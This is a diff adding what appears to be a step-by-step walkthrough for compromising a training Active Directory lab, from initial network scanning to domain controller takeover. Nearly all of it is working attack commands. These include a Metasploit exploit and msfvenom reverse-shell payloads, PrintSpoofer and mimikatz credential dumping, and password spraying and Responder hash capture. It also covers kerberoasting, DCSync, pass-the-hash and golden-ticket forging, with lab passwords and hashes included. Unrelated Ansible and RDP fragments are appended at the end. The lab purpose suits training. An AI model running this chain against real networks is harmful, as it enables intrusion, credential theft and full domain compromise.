@@ -1,0 +1,419 @@
+Connecting into the network.
+
+Linux OVPN:
+$ sudo openvpn client.ovpn
+
+Windows:
+
+Use the OVPN software: OpenVPN Client Connect For Windows | OpenVPN 
+
+SSH into Kali
+
+Linux CLI:
+
+$ ssh -x kali@10.0.1.150
+Password: kali
+
+Windows:
+
+Use the putty software: Download PuTTY - a free SSH and telnet client for Windows 
+
+Identifying Live Hosts
+
+kali CLI $ sudo nmap -n -PR -sn 10.0.1.0/24
+
+And copy each unique IP into a file named targets.txt, separated by new lines
+
+Or alternatively:
+
+kali CLI $ sudo nmap -n -PR -sn 10.0.1.0/24 -oG - | awk '/Up$/{print $2}' > targets.txt
+
+To automatically output the IPs into targets.txt
+
+!!! Make sure to remove any IPs in targets.txt that don’t correspond to target boxes, these may include 10.0.1.1, 10.0.1.150 and 10.0.1.69, as these may cause issues with later commands !!!
+
+WebSrv Initial
+
+Recon of Srv1:
+
+kali CLI $ nmap --top-ports 10 10.0.1.110 -sV -T4 -Pn
+
+This will show HTTP Fileserver httpd 2.3, which on searching in google will result in multiple known remote command execution bugs. From here we can use the metasploit module to gain initial access.
+
+kali CLI $ msfconsole 
+
+MSF CLI $ search rejetto
+
+MSF CLI $ use exploit/windows/http/rejetto_hfs_exec
+
+MSF CLI $ set rhosts 10.0.1.110
+
+MSF CLI $ run
+
+meterpreter > sysinfo
+
+WebSrv Priv esc
+
+meterpreter >  shell
+
+HTTP-ADMIN cmd $ whoami /priv
+
+HTTP-ADMIN cmd $ cd C:\users\http-admin
+
+HTTP-ADMIN cmd $ powershell -ep bypass -c "wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe -o printspoofer.exe"
+
+HTTP-ADMIN cmd $ printspoofer.exe -i -c cmd.exe
+
+This grants us a NT Authority\System shell that we now need to turn into a meterpreter shell
+
+NT-Authority cmd $ exit
+
+HTTP-ADMIN cmd $ powershell -ep bypass -c "wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210810-2/mimikatz_trunk.zip -o mimizip.zip"
+
+HTTP-ADMIN cmd $ powershell
+
+HTTP-ADMIN PS $ expand-archive -Force mimizip.zip
+
+HTTP-ADMIN PS $ exit
+
+HTTP-ADMIN cmd $ printspoofer.exe -i -c cmd.exe
+
+NT-Authority cmd $ C:\users\http-admin\mimizip\x64\mimikatz.exe
+
+NT-Authority mimikatz # privilege::debug
+
+NT-Authority mimikatz # sekurlsa::logonpasswords
+
+This gives us a large list of plaintext, with this we can exit box 1 (exit mimikatz, then system shell, then user shell, then metasploit).
+
+FileShare Initial
+
+Place usernames and passwords into separate usernames.txt and passwords.txt file on your kali machine (http-admin, fileshare-user from mimikatz)
+
+kali CLI $ nano usernames.txt   (insert users one line at a time)
+
+kali CLI $ nano passwords.txt (insert passwords one line at a time)
+
+kali CLI $ nano targets.txt    (insert targets one line at a time)
+
+kali CLI $ crackmapexec smb targets.txt -u usernames.txt -p passwords.txt --shares
+
+kali CLI $ impacket-smbclient demo/fileshare-user@10.0.1.200
+
+kali smblcient $ shares
+
+kali smblcient $ use users-db
+
+kali smblcient $ ls
+
+kali smblcient $ get ftp-admin-creds-DO-NOT-SHARE.txt
+
+kali CLI $ cat ftp-admin-creds-DO-NOT-SHARE.txt
+
+Update usernames.txt and passwords.txt with new credentials
+
+kali CLI $ crackmapexec smb targets.txt -u usernames.txt -p passwords.txt
+
+We can use hydra or CME here but both are constantly buggy, blame our crap infra I guess
+
+kali CLI $ hydra -L usernames.txt -P passwords.txt -M targets.txt -S rdp
+
+kali CLI $ crackmapexec smb targets.txt -u usernames.txt -p passwords.txt -M rdp -o ACTION=enable
+
+kali CLI $ xfreerdp /d:demo.lab /u:fileshare-admin /p:CHANGEME_FILESHAREADMIN_PASSWORD /v:10.0.1.200
+
+!!! If the user doesn’t have X, above will not work - can instead connect from the host where the VPN connection is initialised (mstsc, rdesktop, etc) !!!
+
+kali CLI $ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.1.150 LPORT=443 EXITFUNC=thread -o runner.exe --platform windows -a x64 -f exe
+
+kali CLI $ python3.9 -m http.server
+
+Now download the file the windows box over RDP by opening PowerShell and running the following command
+
+fileshare-admin PS $ wget http://10.0.1.150:8000/runner.exe -o runner.exe
+
+kali CLI $ msfconsole
+
+MSF CLI $ use exploit/multi/handler
+
+MSF CLI $ set payload windows/x64/meterpreter/reverse_https 
+
+MSF CLI $ set lport 443
+
+MSF CLI $ set lhost 10.0.1.150
+
+MSF CLI $ run
+
+fileshare-admin PS $ ./runner.exe
+
+MSF CLI $ sysinfo
+
+You should now be able to close your RDP session without losing your meterpreter shell
+
+FileShare Priv esc
+
+meterpreter >  shell
+
+fileshare-admin cmd $ powershell
+
+fileshare-admin PS $ wget https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe -o winPEASx64.exe
+
+fileshare-admin PS $ ./winPEASx64.exe
+
+fileshare-admin PS $ wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1 -o PowerUp.ps1
+
+fileshare-admin PS $ Import-Module .\PowerUp.ps1
+
+fileshare-admin PS $ Invoke-Allchecks
+
+fileshare-admin PS $ Invoke-ServiceAbuse -Name 'MaintServ'
+
+fileshare-admin PS $ start-process PowerShell -verb runas
+
+Auth with user .\john and password Password123! You can do this over RDP by opening a new terminal, SSHing in to the Kali machine and running:
+
+kali CLI $ xfreerdp /u:john /p:Password123! /v:10.0.1.200
+
+Once authenticated, exit the meterpreter shell in your original terminal by hitting ctrl+c and then using the exit command until you are back at your Kali box CLI, then run the following:
+
+kali CLI $ msfconsole
+
+MSF CLI $ use exploit/multi/handler
+
+MSF CLI $ set payload windows/x64/meterpreter/reverse_https 
+
+MSF CLI $ set lport 443
+
+MSF CLI $ set lhost 10.0.1.150
+
+MSF CLI $ run
+
+In the open RDP session, run PowerShell as an administrator and run the following to open a new meterpreter shell
+
+john PS $ C:\Users\fileshare-admin\runner.exe
+
+Loot around but find nothing, return to Kali
+
+kali CLI $ sudo gunzip -d /usr/share/wordlists/rockyou.txt.gz
+
+kali CLI $ sudo responder -I eth0 -wrf
+
+Add the netntlm hash to the file ‘hash’
+
+kali CLI $ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
+
+kali CLI $ xfreerdp /d:demo.lab /u:BROADCASTER-ADMIN /p:cricket#1 /v:10.0.1.122
+
+!!! If the user doesn’t have X, above will not work - can instead connect from the host where the VPN connection is initialised (mstsc, rdesktop, etc) !!!
+
+Broadcaster Initial
+
+broadcaster-admin PS $ wget https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.exe -o SharpHound.exe
+
+broadcaster-admin PS $ .\SharpHound.exe --CollectionMethods Group,Trusts,LocalAdmin,RDP,ACL,Session
+
+You will need to copy the output zip file from the broadcaster-admin machine to your kali machine (for example, by using a meterpreter shell like with ‘FileShare Initial’, or copy and pasting from RDP)
+
+kali CLI $ sudo neo4j start
+
+!!! You may need to go to the local webserver and change the default creds (neo4j/neo4j) at this point - you can port forward 7474, or connect via RDP to the kali box (will need to install chrome) !!!
+
+kali CLI $ bloodhound
+
+Login to bloodhound using neo4j creds setup in previous step, then drag and drop the zip file from invoke-bloodhound into the bloodhound interface
+
+Within bloodhound, can execute queries:
+
+Path from “BROADCASTER.DEMO.LAB” to “GENERICBOX.DEMO.LAB“ (GenericAll)
+
+Broadcaster Priv esc
+
+We already have admin from the previous exploitation, skip to the next section.
+
+GenericBox Initial
+
+ 
+
+With admin on Broadcaster we want a stable reverse shell to conduct attacks from.
+
+In the directory you generated runner.exe in previously, run:
+
+kali CLI $ python3.9 -m http.server
+
+While logged in as broadcaster-admin, run PowerShell as administrator and run the following
+
+broadcaster-admin PS $ wget http://10.0.1.150:8000/runner.exe -o C:\runner.exe
+
+kali CLI $ sudo msfconsole
+
+MSF CLI $ use exploit/multi/handler
+
+MSF CLI $ set payload windows/x64/meterpreter/reverse_https 
+
+MSF CLI $ set lport 443
+
+MSF CLI $ set lhost 10.0.1.150
+
+MSF CLI $ run
+
+broadcaster-admin PS $ C:\runner.exe
+
+!!! Run the above command as an administrator !!!
+
+MSF CLI $ load mimikatz
+
+MSF CLI $ kiwi_cmd privilege::debug
+
+MSF CLI $ kiwi_cmd sekurlsa::logonPasswords
+
+At this point remember you can run multiple sessions of MSF, use the background command and the sessions -l command to do this.
+
+MSF CLI $ background
+
+MSF CLI $ run -j
+
+MSF CLI $ sessions -i 1
+
+MSF CLI $ kiwi_cmd "sekurlsa::pth /user:BROADCASTER$ /domain:demo.lab /ntlm:6e0975a18c27782e5ddfad2c445d3261 /run:C:\\runner.exe"
+
+MSF CLI $ background
+
+MSF CLI $ sessions -i 2
+
+MSF CLI $ shell
+
+broadcaster-admin shell $ net group LittleOlGroup /domain
+
+broadcaster-admin shell $ net group "LittleOlGroup" "fileshare-admin" /add /domain
+
+broadcaster-admin shell $ net group LittleOlGroup /domain
+
+Above output should show that the user “fileshare-admin” has been added to the “LittleOlGroup”
+
+kali CLI $ impacket-psexec 'demo/fileshare-admin:CHANGEME_FILESHAREADMIN_PASSWORD'@10.0.1.123
+
+We now have admin on GenericBox, get a metasploit shell back as previously covered in the cheatsheet
+
+GenericBox Priv esc
+
+Already have local admin, skip to the next section
+
+DCBackupBox Initial
+
+MSF CLI $ shell
+
+NT-AUTH CLI $ Powershell
+
+NT-AUTH PS $ cd C:\
+
+NT-AUTH PS $ wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe -o Rubeus.exe
+
+NT-AUTH PS $ ./Rubeus.exe kerberoast /nowrap
+
+You’ll get allot of output here, the main things we are focused on are the svc_legacy-web account hash
+
+Grab the hash and put it in a local text file named kerb.txt
+
+kali CLI $ john --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt kerb.txt
+
+We now have a new user, lets see if it can go anywhere new, add them to the previous usernames.txt (svc_legacy-web) and passwords.txt (arsenal1!) file
+
+kali CLI $ crackmapexec smb targets.txt -u usernames.txt -p passwords.txt -M rdp -o ACTION=Enable
+
+kali CLI $ hydra -L usernames.txt -P passwords.txt -M targets.txt -S rdp
+
+We can see RDP access to DCBackupBox, RDP in and download the runner and return a meterpeter shell as usual.
+
+xfreerdp /d:demo.lab /u:svc_legacy-web /p:arsenal1! /v:10.0.1.124
+
+!!! If the user doesn’t have X, above will not work - can instead connect from the host where the VPN connection is initialised (mstsc, rdesktop, etc) !!!
+
+DCBackupBox Priv esc
+
+svc_legacy-web PS $ wget https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe -o winPEASx64.exe
+
+svc_legacy-web PS $ ./winPEASx64.exe
+
+Noticed that the AlwaysInstallElevated key is set to 1, we can abuse this for admin. We’ll use an easy metasploit module for this, background your shell and run the following. 
+
+MSF CLI $ use exploit/windows/local/always_install_elevated
+
+MSF CLI $ set session 1
+
+MSF CLI $ set payload windows/x64/meterpreter/reverse_tcp
+
+MSF CLI $ run
+
+!!! If the above doesn’t work, ansible may need to re-run to set 2x registry values !!!
+
+From here we’ll mimkatz the box.
+
+MSF CLI $ load kiwi
+
+MSF CLI $ creds_all
+
+Notice the dc-syncer account, grab their NTLM (b5c9174863de24c2a50e7c61a4ac061d)
+
+DC01 Initial
+
+kali CLI $ impacket-secretsdump -hashes ':b5c9174863de24c2a50e7c61a4ac061d' 'dc-syncer@10.0.1.100'
+
+Grab all the valuable output (i.e., the krbtgt user’s hash), these are the hashes of everyone in the domain
+
+kali CLI $ impacket-psexec -hashes ':d010524e2114f18dfee952428a4df360' 'domain-administrator@10.0.1.100'
+
+DC01 Priv esc
+
+No need.
+
+Domain Controller Looting
+
+We’ll now make a golden ticket to give us control from any machine
+
+DC01 CLI $ powershell
+
+DC01 PS $ cd C:\
+
+DC01 PS $ wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1 -o Powerview.ps1
+
+DC01 PS $ import-module ./Powerview.ps1
+
+DC01 PS $ Get-DomainSID
+
+Can also extract the SID using ‘whoami /all’ from a Domain User account and removing the RID
+
+Grab the domain sid and go back to kali to make the ticket
+
+kali CLI $ impacket-ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <domain_name>  <user_name>
+
+For example:
+
+kali CLI $ impacket-ticketer -nthash f9be805c12d1bebc875fd7b417c2f782 -domain-sid S-1-5-21-3977036785-4258717721-12546100 -domain demo.lab krbtgt
+
+!!! You can’t just copy and paste from above, need to add the ntlm hash and SID from your domain !!!
+
+Then export the ticket
+
+kali CLI $ export KRB5CCNAME=krbtgt.ccache
+
+kali CLI $ sudo nano /etc/hosts
+
+Input all the srv’s and their Ip addresses (i.e., 10.0.1.124 DCBackupBox)
+
+kali CLI $ impacket-psexec 'krbtgt@WebSrv' -no-pass -k
+
+
+
+- name: Restrict write and execute access to User Fed-Phil
+  ansible.windows.win_acl:
+    user: HaroldHolt
+    path: C:\
+    type: allow
+    rights: ExecuteFile,Write
+
+
+ansible-playbook ansible/domain-playbooks/Box3.yml -i " + TerraformIPs["thirdserver"] + ", --extra-vars \"{'ansible_user':'" + ansible_user +"','ansible_password':'"+ansible_password+"','ansible_connection':'winrm', 'ansible_winrm_transport':'ntlm','ansible_winrm_server_cert_validation':'ignore'}\""
+
+
+
+xfreerdp /v:10.0.1.122 /u:HaroldHolt /pth:8846F7EAEE8FB117AD06BDD830B7586C
